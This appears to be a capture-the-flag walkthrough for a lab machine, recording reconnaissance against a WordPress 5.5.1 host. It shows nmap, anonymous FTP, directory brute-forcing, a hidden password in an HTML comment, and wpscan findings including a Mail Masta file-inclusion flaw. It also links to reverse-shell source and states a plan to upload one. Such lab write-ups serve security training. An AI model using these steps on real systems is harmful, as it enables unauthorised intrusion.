# All in One

Laurent Chauvin | April 16, 2024

## Resources

[1] https://book.hacktricks.xyz/pentesting-web/file-inclusion
[2] https://gchq.github.io/CyberChef
[3] https://www.dcode.fr/vigenere-cipher
[4] https://howtowp.com/how-to-upload-a-shell-in-wordpress/
[5] https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
[6] https://gtfobins.github.io/

## Progress

```
export IP=10.10.97.156
```

Nmap scan:

```bash
nmap -sC -sV -oN nmap/initial 10.10.97.156

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 16:49 EDT
Nmap scan report for 10.10.97.156
Host is up (0.092s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.31.49
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.32 seconds
```

Anonymous FTP allowed.

Let's check the website for now. Just the default Apache page.

Let's `gobuster`.

In the meantime, let's check the ftp:

```bash
ftp anonymous@10.10.97.156

Connected to 10.10.97.156.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: <Enter>
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||60830|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> ls -al
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        115          4096 Oct 06  2020 .
drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
226 Directory send OK.
ftp> 
```

Not much here. Maybe we could upload a reverse shell, and execute it through the website.

`gobuster` returned some interesting findings:

```bash
obuster dir -u 10.10.97.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.97.156
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.97.156/wordpress/]
/hackathons           (Status: 200) [Size: 197]
```

Going to `hackathons` we find:

```html
<h1>Damn how much I hate the smell of <i>Vinegar </i> :/ !!!  </h1>
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

I tried to use `Dvc@W@iyur@123` for ftp but it's anonymous only. Also tried for ssh, no success.

Let's check the `wordpress` website. We can find a user who wrote an article `elyana`. Might be useful.

Looking in the header, we can find `<meta name="generator" content="WordPress 5.5.1">`. Let's search for an exploit:

```bash
searchsploit Wordpress 5.5.1   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                                                                                                                                                   | php/webapps/51042.txt
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                                                                                       | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                                                                                 | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                                                                               | php/webapps/48918.sh
WordPress Plugin WatuPRO 5.5.1 - SQL Injection                                                                                                                                                            | php/webapps/42291.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

Let's scan for info:

```bash
wpscan --url http://10.10.97.156/wordpress --enumerate vp --api-token <token>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.97.156/wordpress/ [10.10.97.156]
[+] Started: Tue Apr 16 17:23:36 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.97.156/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.97.156/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.97.156/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.97.156/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.97.156/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.97.156/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |
 | [!] 47 vulnerabilities identified:
 |
 | [!] Title: WordPress < 5.5.2 - Hardening Deserialization Requests
 |     Fixed in: 5.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/f2bd06cf-f4e9-4077-90b0-fba80c3d0969
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28032
 |      - https://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/add6bedf3a53b647d0ebda2970057912d3cd79d3
 |      - https://blog.wpscan.com/2020/10/30/wordpress-5.5.2-security-release.html
 |      - https://github.com/WordPress/Requests/security/advisories/GHSA-52qp-jpq7-6c54
 |
 | [!] Title: WordPress < 5.5.2 - Disable Spam Embeds from Disabled Sites on a Multisite Network
 |     Fixed in: 5.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/a1941f4f-6adb-41e9-b47f-6eddd6f6a04a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28033
 |      - https://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2020/10/30/wordpress-5.5.2-security-release.html
 |
 | [!] Title: WordPress < 5.5.2 - Cross-Site Scripting (XSS) via Global Variables
 |     Fixed in: 5.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/336deb2e-5286-422d-9aa2-6898877d55a9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28034
 |      - https://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2020/10/30/wordpress-5.5.2-security-release.html
 |
 | [!] Title: WordPress < 5.5.2 - XML-RPC Privilege Escalation
 |     Fixed in: 5.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/76a05ec0-08f3-459f-8379-3b4865a0813f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28035
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28036
 |      - https://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/c9e6b98968025b1629015998d12c3102165a7d32
 |      - https://blog.wpscan.com/2020/10/30/wordpress-5.5.2-security-release.html
 |
 | [!] Title: WordPress < 5.5.2 - Unauthenticated DoS Attack to RCE
 |     Fixed in: 5.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/016774df-5031-4315-a893-a47d99273883
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28037
 |      - https://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca15d1e5ce70493c5c0c096ca0c76503d6da07c
 |      - https://blog.wpscan.com/2020/10/30/wordpress-5.5.2-security-release.html
 |      - https://threatpost.com/wordpress-patches-rce-bug/160812/
 |
 | [!] Title: WordPress < 5.5.2 - Stored XSS in Post Slugs
 |     Fixed in: 5.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/990cf4ff-0084-4a5c-8fdb-db374ffcb5df
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28038
 |      - https://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2020/10/30/wordpress-5.5.2-security-release.html
 |
 | [!] Title: WordPress < 5.5.2 - Protected Meta That Could Lead to Arbitrary File Deletion
 |     Fixed in: 5.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/30662254-5a8d-40d0-8a31-eb58b51b3c33
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28039
 |      - https://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d5ddd6d4be1bc9fd16b7796842e6fb26315705ad
 |      - https://blog.wpscan.com/2020/10/30/wordpress-5.5.2-security-release.html
 |
 | [!] Title: WordPress < 5.5.2 - Cross-Site Request Forgery (CSRF) to Change Theme Background
 |     Fixed in: 5.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/ebd354db-ab63-4644-891c-4a200e9eef7e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28040
 |      - https://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/cbcc595974d5aaa025ca55625bf68ef286bd8b41
 |      - https://blog.wpscan.com/wordpress-5-5-2-security-release/
 |      - https://hackerone.com/reports/881855
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 5.5.4
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 5.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     Fixed in: 5.5.6
 |     References:
 |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     Fixed in: 5.5.6
 |     References:
 |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
 |
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     Fixed in: 5.5.6
 |     References:
 |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/lodash/lodash/wiki/Changelog
 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     Fixed in: 5.5.7
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.5.8
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.5.8
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.5.8
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.5.8
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.5.9
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.5.10
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 5.5.10
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 5.5.10
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 5.5.11
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 5.5.12
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     Fixed in: 5.5.12
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 5.5.12
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 5.5.12
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 5.5.12
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     Fixed in: 5.5.13
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 5.5.13
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 5.5.13
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     Fixed in: 5.5.13
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 5.5.14
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 5.5.14
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.97.156/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://10.10.97.156/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://10.10.97.156/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.97.156/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.10.97.156/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956
 |      - https://www.exploit-db.com/exploits/40290/
 |      - https://www.exploit-db.com/exploits/50226/
 |      - https://cxsecurity.com/issue/WLB-2016080220
 |
 | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
 |     References:
 |      - https://wpscan.com/vulnerability/c992d921-4f5a-403a-9482-3131c69e383a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6570
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6571
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6572
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6573
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6574
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6575
